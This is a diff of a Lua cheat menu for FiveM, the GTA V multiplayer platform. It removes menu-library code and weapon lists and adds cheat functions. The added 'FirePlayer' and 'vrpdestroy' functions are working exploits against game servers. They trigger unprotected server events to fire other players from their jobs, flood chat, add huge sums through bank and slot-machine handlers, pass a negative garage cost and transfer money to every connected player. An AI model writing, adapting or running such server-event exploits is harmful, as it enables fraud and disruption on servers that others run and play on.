-            J(f, 'subTitle', menuso[a9].subTitle)
-        end
-        J(f, 'previousMenu', a9)
-        J(f, 'x', menuso[a9].x)
-        J(f, 'y', menuso[a9].y)
-        J(f, 'maxOptionCount', menuso[a9].maxOptionCount)
-        J(f, 'titleFont', menuso[a9].titleFont)
-        J(f, 'titleColor', menuso[a9].titleColor)
-        J(f, 'titleBackgroundColor', menuso[a9].titleBackgroundColor)
-        J(f, 'titleBackgroundSprite', menuso[a9].titleBackgroundSprite)
-        J(f, 'menuTextColor', menuso[a9].menuTextColor)
-        J(f, 'menuSubTextColor', menuso[a9].menuSubTextColor)
-        J(f, 'menuFocusTextColor', menuso[a9].menuFocusTextColor)
-        J(f, 'menuFocusBackgroundColor', menuso[a9].menuFocusBackgroundColor)
-        J(f, 'menuBackgroundColor', menuso[a9].menuBackgroundColor)
-        J(f, 'subTitleBackgroundColor', menuso[a9].subTitleBackgroundColor)
-    else
-        H('Failed to create ' .. tostring(f) .. ' submenu: ' .. tostring(a9) .. " parent menu doesn't exist")
-    end
-end
-
-function VladmirAK47.CurrentMenu()
-    return t
-end
-
-function VladmirAK47.OpenMenu(f)
-    if f and menuso[f] then
-        PlaySoundFrontend(-1, 'SELECT', 'HUD_MINIGAME_SOUNDSET', true)
-        M(f, true)
-        if menuso[f].titleBackgroundSprite then
-            RequestStreamedTextureDict(menuso[f].titleBackgroundSprite.dict, false)
-            while not HasStreamedTextureDictLoaded(menuso[f].titleBackgroundSprite.dict) do
-                Citizen.Wait(0)
-            end
-        end
-        H(tostring(f) .. ' menu opened')
-    else
-        H('Failed to open ' .. tostring(f) .. " menu: it doesn't exist")
-    end
-end
-
-function VladmirAK47.IsMenuOpened(f)
-    return L(f)
-end
-
-function VladmirAK47.IsAnyMenuOpened()
-    for f, _ in pairs(o) do
-        if L(f) then
-            return true
-        end
-    end
-    return false
-end
-
-function VladmirAK47.IsMenuAboutToBeClosed()
-    if menuso[t] then
-        return menuso[t].aboutToBeClosed
-    else
-        return false
-    end
-end
-
-function VladmirAK47.CloseMenu()
-    if menuso[t] then
-        if menuso[t].aboutToBeClosed then
-            menuso[t].aboutToBeClosed = false
-            M(t, false)
-            H(tostring(t) .. ' menu closed')
-            PlaySoundFrontend(-1, 'QUIT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
-            q = 0
-            t = nil
-            s = nil
-        else
-            menuso[t].aboutToBeClosed = true
-            H(tostring(t) .. ' menu about to be closed')
-        end
-    end
-end
-
-function VladmirAK47.Button(I, a2)
-    local ab = I
-    if a2 then
-        ab = '{ ' .. tostring(ab) .. ', ' .. tostring(a2) .. ' }'
-    end
-    if menuso[t] then
-        q = q + 1
-        local ac = menuso[t].currentOption == q
-        a1(I, a2)
-        if ac then
-            if s == p.select then
-                PlaySoundFrontend(-1, menuso[t].buttonPressedSound.name, menuso[t].buttonPressedSound.set, true)
-                H(ab .. ' button pressed')
-                return true
-            elseif s == p.left or s == p.right then
-                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
-            end
-        end
-        return false
-    else
-        H('Failed to create ' .. ab .. ' button: ' .. tostring(t) .. " menu doesn't exist")
-        return false
-    end
-end
-
-function VladmirAK47.MenuButton(I, f)
-    if menuso[f] then
-        if VladmirAK47.Button(I) then
-            M(t, false)
-            M(f, true, true)
-            return true
-        end
-    else
-        H('Failed to create ' .. tostring(I) .. ' menu button: ' .. tostring(f) .. " submenu doesn't exist")
-    end
-    return false
-end
-
-function VladmirAK47.CheckBox(I, bool, ad)
-    local ae = '~r~❌'
-    if bool then
-        ae = '~g~✅'
-    end
-    if VladmirAK47.Button(I, ae) then
-        bool = not bool
-        H(tostring(I) .. ' checkbox changed to ' .. tostring(bool))
-        ad(bool)
-        return true
-    end
-    return false
-end
-
-function VladmirAK47.ComboBox(I, af, ag, ah, ad)
-    local ai = #af
-    local aj = af[ag]
-    local ac = menuso[t].currentOption == q + 1
-    if ai > 1 and ac then
-        aj = '← ' .. tostring(aj) .. ' →'
-    end
-    if VladmirAK47.Button(I, aj) then
-        ah = ag
-        ad(ag, ah)
-        return true
-    elseif ac then
-        if s == p.left then
-            if ag > 1 then
-                ag = ag - 1
-            else
-                ag = ai
-            end
-        elseif s == p.right then
-            if ag < ai then
-                ag = ag + 1
-            else
-                ag = 1
-            end
-        end
-    else
-        ag = ah
-    end
-    ad(ag, ah)
-    return false
-end
-
-function VladmirAK47.Display()
-    if L(t) then
-        if menuso[t].aboutToBeClosed then
-            VladmirAK47.CloseMenu()
-        else
-            ClearAllHelpMessages()
-            Y()
-            Z()
-            s = nil
-            if IsDisabledControlJustPressed(0, p.down) then
-                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
-                if menuso[t].currentOption < q then
-                    menuso[t].currentOption = menuso[t].currentOption + 1
-                else
-                    menuso[t].currentOption = 1
-                end
-            elseif IsDisabledControlJustPressed(0, p.up) then
-                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
-                if menuso[t].currentOption > 1 then
-                    menuso[t].currentOption = menuso[t].currentOption - 1
-                else
-                    menuso[t].currentOption = q
-                end
-            elseif IsDisabledControlJustPressed(0, p.left) then
-                s = p.left
-            elseif IsDisabledControlJustPressed(0, p.right) then
-                s = p.right
-            elseif IsDisabledControlJustPressed(0, p.select) then
-                s = p.select
-            elseif IsDisabledControlJustPressed(0, p.back) then
-                if menuso[menuso[t].previousMenu] then
-                    PlaySoundFrontend(-1, 'BACK', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
-                    M(menuso[t].previousMenu, true)
-                else
-                    VladmirAK47.CloseMenu()
-                end
-            end
-            q = 0
-        end
-    end
-end
-
-function VladmirAK47.SetMenuWidth(f, X)
-    J(f, 'width', X)
-end
-
-function VladmirAK47.SetMenuX(f, x)
-    J(f, 'x', x)
-end
-
-function VladmirAK47.SetMenuY(f, y)
-    J(f, 'y', y)
-end
-
-function VladmirAK47.SetMenuMaxOptionCountOnScreen(f, count)
-    J(f, 'maxOptionCount', count)
-end
-
-function VladmirAK47.SetTitleColor(f, r, g, b, ak)
-    J(
-        f,
-        'titleColor',
-        {
-            ['r'] = r,
-            ['g'] = g,
-            ['b'] = b,
-            ['a'] = ak or menuso[f].titleColor.a
-        }
-    )
-end
-
-function VladmirAK47.SetTitleBackgroundColor(f, r, g, b, ak)
-    J(
-        f,
-        'titleBackgroundColor',
-        {
-            ['r'] = r,
-            ['g'] = g,
-            ['b'] = b,
-            ['a'] = ak or menuso[f].titleBackgroundColor.a
-        }
-    )
-end
-
-function VladmirAK47.SetTitleBackgroundSprite(f, al, am)
-    J(
-        f,
-        'titleBackgroundSprite',
-        {
-            dict = al,
-            name = am
-        }
-    )
-end
-
-function VladmirAK47.SetSubTitle(f, I)
-    J(f, 'subTitle', I)
-end
-
-function VladmirAK47.SetMenuBackgroundColor(f, r, g, b, ak)
-    J(
-        f,
-        'menuBackgroundColor',
-        {
-            ['r'] = r,
-            ['g'] = g,
-            ['b'] = b,
-            ['a'] = ak or menuso[f].menuBackgroundColor.a
-        }
-    )
-end
-
-function VladmirAK47.SetMenuTextColor(f, r, g, b, ak)
-    J(
-        f,
-        'menuTextColor',
-        {
-            ['r'] = r,
-            ['g'] = g,
-            ['b'] = b,
-            ['a'] = ak or menuso[f].menuTextColor.a
-        }
-    )
-end
-
-function VladmirAK47.SetMenuSubTextColor(f, r, g, b, ak)
-    J(
-        f,
-        'menuSubTextColor',
-        {
-            ['r'] = r,
-            ['g'] = g,
-            ['b'] = b,
-            ['a'] = ak or menuso[f].menuSubTextColor.a
-        }
-    )
-end
-
-function VladmirAK47.SetMenuFocusColor(f, r, g, b, ak)
-    J(
-        f,
-        'menuFocusColor',
-        {
-            ['r'] = r,
-            ['g'] = g,
-            ['b'] = b,
-            ['a'] = ak or menuso[f].menuFocusColor.a
-        }
-    )
-end
-
-function VladmirAK47.SetMenuButtonPressedSound(f, name, an)
-    J(
-        f,
-        'buttonPressedSound',
-        {
-            ['name'] = name,
-            ['set'] = an
-        }
-    )
-end
-
-function KeyboardInput(ao, ap, aq)
-    AddTextEntry('FMMC_KEY_TIP1', ao .. ':')
-    DisplayOnscreenKeyboard(1, 'FMMC_KEY_TIP1', '', ap, '', '', '', aq)
-    blockinput = true
-    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
-        Citizen.Wait(0)
-    end
-    if UpdateOnscreenKeyboard() ~= 2 then
-        AddTextEntry('FMMC_KEY_TIP1', '')
-        local m = GetOnscreenKeyboardResult()
-        Citizen.Wait(500)
-        blockinput = false
-        return m
-    else
-        AddTextEntry('FMMC_KEY_TIP1', '')
-        Citizen.Wait(500)
-        blockinput = false
-        return nil
-    end
-end
-local function ar()
-    local as = {}
-    for i = 0, GetNumberOfPlayers() do
-        if NetworkIsPlayerActive(i) then
-            as[#as + 1] = i
-        end
-    end
-    return as
-end
-
-function DrawText3D(x, y, z, I, r, g, b)
-    SetDrawOrigin(x, y, z, 0)
-    SetTextFont(0)
-    SetTextProportional(0)
-    SetTextScale(0.0, 0.20)
-    SetTextColour(r, g, b, 255)
-    SetTextDropshadow(0, 0, 0, 0, 255)
-    SetTextEdge(2, 0, 0, 0, 150)
-    SetTextDropShadow()
-    SetTextOutline()
-    SetTextEntry('STRING')
-    SetTextCentre(1)
-    AddTextComponentString(I)
-    DrawText(0.0, 0.0)
-    ClearDrawOrigin()
-end
-
-function math.round(at, au)
-    return tonumber(string.format('%.' .. (au or 0) .. 'f', at))
-end
-local function k(l)
-    local m = {}
-    local n = GetGameTimer() / 1000
-    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
-    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
-    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
-    return m
-end
-local function av(I, aw)
-    SetNotificationTextEntry('STRING')
-    AddTextComponentString(I)
-    DrawNotification(aw, false)
-    if rgbnot then
-        for i = 0, 24 do
-            i = i + 1
-            SetNotificationBackgroundColor(i)
-        end
-    else
-        SetNotificationBackgroundColor(24)
-    end
-end
 
 function checkValidVehicleExtras()
     local ax = PlayerPedId()
@@ -1617,6 +1057,31 @@ function checkValidVehicleExtras()
         end
     end
     return az
+end
+
+function FirePlayer(SelectedPlayer)
+	if ESX then
+		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)
+
+			local playerMatch = nil
+			for i=1, #players, 1 do
+						label = players[i].name
+						value = players[i].source
+						name = players[i].name
+						if name == GetPlayerName(SelectedPlayer) then
+							playerMatch = players[i].identifier
+							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
+						end
+						identifier = players[i].identifier
+			end
+
+
+
+			ESX.TriggerServerCallback('esx_society:setJob', function()
+			end, playerMatch, 'unemployed', 0, 'hire')
+
+		end)
+	end
 end
 
 function DoesVehicleHaveExtras(veh)
@@ -1679,6 +1144,7 @@ function checkValidVehicleMods(aC)
     end
     return az
 end
+
 local aH = {
     'Dinghy',
     'Dinghy2',
@@ -1739,6 +1205,66 @@ local aJ = {
     'Prarire',
     'Rhapsody'
 }
+
+local function ClonePedVeh()
+    local ped = GetPlayerPed(SelectedPlayer)
+    local pedVeh = nil
+    local PlayerPed = PlayerPedId()
+    if IsPedInAnyVehicle(ped, false) then
+        pedVeh = GetVehiclePedIsIn(ped, false)
+    else
+        pedVeh = GetVehiclePedIsIn(ped, true)
+        if DoesEntityExist(pedVeh) then
+            local vmh = GetEntityModel(pedVeh)
+            local playerpos = GetEntityCoords(PlayerPed, false)
+            local playerveh =
+                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), true, true)
+            SetPedIntoVehicle(PlayerPed, playerveh, -1)
+            local pcolor, scolor = nil
+            GetVehicleColours(pedVeh, pcolor, scolor)
+            SetVehicleColours(playerveh, pcolor, scolor)
+            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
+                SetVehicleModKit(playerveh, 0)
+                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
+                local pc, wc = nil
+                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
+                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
+                GetVehicleExtraColours(pedVeh, pc, wc)
+                SetVehicleExtraColours(playerveh, pc, wc)
+            end
+        end
+    end
+end
+
+
+function vrpdestroy()
+                for bD = 0, 9 do
+                    TriggerServerEvent(
+                        '_chat:messageEntered',
+                        'xaxaxaxaxaxaxaxaxax',
+                        {
+                            141,
+                            211,
+                            255
+                        },
+                        '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
+                    )
+                end
+                TriggerServerEvent(
+                    'lscustoms:payGarage',
+                    {
+                        costs = -99999999
+                    }
+                )
+                TriggerServerEvent('vrp_slotmachine:server:2', 999999999)
+                TriggerServerEvent('Banca:deposit', 999999999)
+                TriggerServerEvent('bank:deposit', 999999999)
+                local di = GetPlayerServerId(PlayerId())
+                for i = 0, 256 do
+                    TriggerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
+                end
+            end
+			
 local aK = {
     'CogCabrio',
     'Exemplar',
@@ -2437,4030 +1963,1420 @@ local b5 = {
     'Trailers2',
     'Trailers3'
 }
-local b6 = {
-    'WEAPON_KNIFE',
-    'WEAPON_KNUCKLE',
-    'WEAPON_NIGHTSTICK',
-    'WEAPON_HAMMER',
-    'WEAPON_BAT',
-    'WEAPON_GOLFCLUB',
-    'WEAPON_CROWBAR',
-    'WEAPON_BOTTLE',
-    'WEAPON_DAGGER',
-    'WEAPON_HATCHET',
-    'WEAPON_MACHETE',
-    'WEAPON_FLASHLIGHT',
-    'WEAPON_SWITCHBLADE',
-    'WEAPON_PISTOL',
-    'WEAPON_PISTOL_MK2',
-    'WEAPON_COMBATPISTOL',
-    'WEAPON_APPISTOL',
-    'WEAPON_PISTOL50',
-    'WEAPON_SNSPISTOL',
-    'WEAPON_HEAVYPISTOL',
-    'WEAPON_VINTAGEPISTOL',
-    'WEAPON_STUNGUN',
-    'WEAPON_FLAREGUN',
-    'WEAPON_MARKSMANPISTOL',
-    'WEAPON_REVOLVER',
-    'WEAPON_MICROSMG',
-    'WEAPON_SMG',
-    'WEAPON_SMG_MK2',
-    'WEAPON_ASSAULTSMG',
-    'WEAPON_MG',
-    'WEAPON_COMBATMG',
-    'WEAPON_COMBATMG_MK2',
-    'WEAPON_COMBATPDW',
-    'WEAPON_GUSENBERG',
-    'WEAPON_MACHINEPISTOL',
-    'WEAPON_ASSAULTRIFLE',
-    'WEAPON_ASSAULTRIFLE_MK2',
-    'WEAPON_CARBINERIFLE',
-    'WEAPON_CARBINERIFLE_MK2',
-    'WEAPON_ADVANCEDRIFLE',
-    'WEAPON_SPECIALCARBINE',
-    'WEAPON_BULLPUPRIFLE',
-    'WEAPON_COMPACTRIFLE',
-    'WEAPON_PUMPSHOTGUN',
-    'WEAPON_SAWNOFFSHOTGUN',
-    'WEAPON_BULLPUPSHOTGUN',
-    'WEAPON_ASSAULTSHOTGUN',
-    'WEAPON_MUSKET',
-    'WEAPON_HEAVYSHOTGUN',
-    'WEAPON_DBSHOTGUN',
-    'WEAPON_SNIPERRIFLE',
-    'WEAPON_HEAVYSNIPER',
-    'WEAPON_HEAVYSNIPER_MK2',
-    'WEAPON_MARKSMANRIFLE',
-    'WEAPON_GRENADELAUNCHER',
-    'WEAPON_GRENADELAUNCHER_SMOKE',
-    'WEAPON_RPG',
-    'WEAPON_STINGER',
-    'WEAPON_FIREWORK',
-    'WEAPON_HOMINGLAUNCHER',
-    'WEAPON_GRENADE',
-    'WEAPON_STICKYBOMB',
-    'WEAPON_PROXMINE',
-    'WEAPON_BZGAS',
-    'WEAPON_SMOKEGRENADE',
-    'WEAPON_MOLOTOV',
-    'WEAPON_FIREEXTINGUISHER',
-    'WEAPON_PETROLCAN',
-    'WEAPON_SNOWBALL',
-    'WEAPON_FLARE',
-    'WEAPON_BALL'
-	
+
+local currentMenuX = 1
+local selectedMenuX = 1
+local currentMenuY = 1
+local selectedMenuY = 1
+local menuX = { 0.75, 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7 }
+local menuY = { 0.1, 0.025, 0.2, 0.3, 0.425 }
+
+local discordPresence = true
+
+
+
+local SelectedPlayer
+local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
+local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
+local peds2 = { "s_m_y_baywatch_01", "a_m_m_acult_01", "ig_barry", "g_m_y_ballaeast_01", "u_m_y_babyd", "a_m_y_acult_01", "a_m_m_afriamer_01", "u_m_y_corpse_01", "s_m_m_armoured_02", "g_m_m_armboss_01", "g_m_y_armgoon_02", "s_m_y_blackops_03", "s_m_y_blackops_01", "s_m_y_prismuscl_01", "g_m_m_chemwork_01", "a_m_y_musclbeac_01", "csb_cop", "s_m_y_clown_01", "s_m_y_cop_01", "u_m_y_zombie_01" }
+local peds3 = { "cs_debra", "a_f_m_beach_01", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_y_business_04", "mp_f_cocaine_01", "u_f_y_corpse_01", "mp_f_meth_01", "g_f_importexport_01", "a_f_y_vinewood_04", "a_m_m_tranvest_01", "a_m_m_tranvest_02", "ig_tracydisanto", "csb_stripper_02", "s_f_y_stripper_01", "a_f_m_soucentmc_01", "a_f_m_soucent_02", "u_f_y_poppymich", "ig_patricia", "s_f_y_cop_01" }
+local peds4 = { "a_c_husky", "a_c_cat_01", "a_c_boar", "a_c_sharkhammer", "a_c_coyote", "a_c_chimp", "a_c_chop", "a_c_cow", "a_c_deer", "a_c_dolphin", "a_c_fish", "a_c_hen", "a_c_humpback", "a_c_killerwhale", "a_c_mtlion", "a_c_pig", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_rhesus", "a_c_rottweiler", "a_c_sharktiger", "a_c_shepherd", "a_c_westy" }
+local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
+local vehicleSpeed = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }
+
+local currentVehicle = 1
+local selectedVehicle = 1
+
+local currentVehicleSpeed = 16
+local selectedVehicleSpeed = 16
+
+local currentBone = 1
+local selectedBone = 1
+
+local currentDamage = 1
+local selectedDamage = 1
+
+local currentPed = 1
+local selectedPed = 1
+local selectedPedd = 1
+local currentPedd = 1
+local selectedPeddd = 1
+local currentPeddd = 1
+local selectedPedddd = 1
+local currentPedddd = 1
+
+local currentBullet = 1
+local selectedBullet = 1
+
+local menus = { }
+local Keys = {
+  ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, 
+  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, 
+  ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
+  ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
+  ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
+  ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, 
+  ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
+  ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
+  ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
 }
-local b7 = {
-    Melee = {
-        BaseballBat = {
-            id = 'weapon_bat',
-            name = '~h~~p~▶ ~s~Baseball Bat',
-            bInfAmmo = false,
-            mods = {}
-        },
-        BrokenBottle = {
-            id = 'weapon_bottle',
-            name = '~h~~p~▶ ~s~Broken Bottle',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Crowbar = {
-            id = 'weapon_Crowbar',
-            name = '~h~~p~▶ ~s~Crowbar',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Flashlight = {
-            id = 'weapon_flashlight',
-            name = '~h~~p~▶ ~s~Flashlight',
-            bInfAmmo = false,
-            mods = {}
-        },
-        GolfClub = {
-            id = 'weapon_golfclub',
-            name = '~h~~p~▶ ~s~Golf Club',
-            bInfAmmo = false,
-            mods = {}
-        },
-        BrassKnuckles = {
-            id = 'weapon_knuckle',
-            name = '~h~~p~▶ ~s~Brass Knuckles',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Knife = {
-            id = 'weapon_knife',
-            name = '~h~~p~▶ ~s~Knife',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Machete = {
-            id = 'weapon_machete',
-            name = '~h~~p~▶ ~s~Machete',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Switchblade = {
-            id = 'weapon_switchblade',
-            name = '~h~~p~▶ ~s~Switchblade',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Nightstick = {
-            id = 'weapon_nightstick',
-            name = '~h~~p~▶ ~s~Nightstick',
-            bInfAmmo = false,
-            mods = {}
-        },
-        BattleAxe = {
-            id = 'weapon_battleaxe',
-            name = '~h~~p~▶ ~s~Battle Axe',
-            bInfAmmo = false,
-            mods = {}
-        }
-    },
-    Handguns = {
-        Pistol = {
-            id = 'weapon_pistol',
-            name = '~h~~p~▶ ~s~Pistol',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_PISTOL_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_PISTOL_CLIP_02'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_PI_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_PI_SUPP_02'
-                    }
-                }
-            }
-        },
-        PistolMK2 = {
-            id = 'weapon_pistol_mk2',
-            name = '~h~~p~▶ ~s~Pistol MK 2',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_PISTOL_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_PISTOL_MK2_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tracer Rounds',
-                        id = 'COMPONENT_PISTOL_MK2_CLIP_TRACER'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Incendiary Rounds',
-                        id = 'COMPONENT_PISTOL_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Hollow Point Rounds',
-                        id = 'COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~FMJ Rounds',
-                        id = 'COMPONENT_PISTOL_MK2_CLIP_FMJ'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Mounted Scope',
-                        id = 'COMPONENT_AT_PI_RAIL'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_PI_FLSH_02'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Compensator',
-                        id = 'COMPONENT_AT_PI_COMP'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Suppessor',
-                        id = 'COMPONENT_AT_PI_SUPP_02'
-                    }
-                }
-            }
-        },
-        CombatPistol = {
-            id = 'weapon_combatpistol',
-            name = '~h~Combat Pistol',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_COMBATPISTOL_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_COMBATPISTOL_CLIP_02'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_PI_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_PI_SUPP'
-                    }
-                }
-            }
-        },
-        APPistol = {
-            id = 'weapon_appistol',
-            name = 'AP Pistol',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_APPISTOL_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_APPISTOL_CLIP_02'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_PI_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_PI_SUPP'
-                    }
-                }
-            }
-        },
-        StunGun = {
-            id = 'weapon_stungun',
-            name = '~h~~p~▶ ~s~Stun Gun',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Pistol50 = {
-            id = 'weapon_pistol50',
-            name = '~h~~p~▶ ~s~Pistol .50',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_PISTOL50_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_PISTOL50_CLIP_02'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_PI_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_PI_SUPP_02'
-                    }
-                }
-            }
-        },
-        SNSPistol = {
-            id = 'weapon_snspistol',
-            name = '~h~~p~▶ ~s~SNS Pistol',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_SNSPISTOL_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_SNSPISTOL_CLIP_02'
-                    }
-                }
-            }
-        },
-        SNSPistolMkII = {
-            id = 'weapon_snspistol_mk2',
-            name = '~h~~p~▶ ~s~SNS Pistol Mk II',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tracer Rounds',
-                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_TRACER'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Incendiary Rounds',
-                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Hollow Point Rounds',
-                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~FMJ Rounds',
-                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_FMJ'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Mounted Scope',
-                        id = 'COMPONENT_AT_PI_RAIL_02'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_PI_FLSH_03'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Compensator',
-                        id = 'COMPONENT_AT_PI_COMP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_PI_SUPP_02'
-                    }
-                }
-            }
-        },
-        HeavyPistol = {
-            id = 'weapon_heavypistol',
-            name = '~h~~p~▶ ~s~Heavy Pistol',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_HEAVYPISTOL_CLIP_01'
-                    },
-                    {
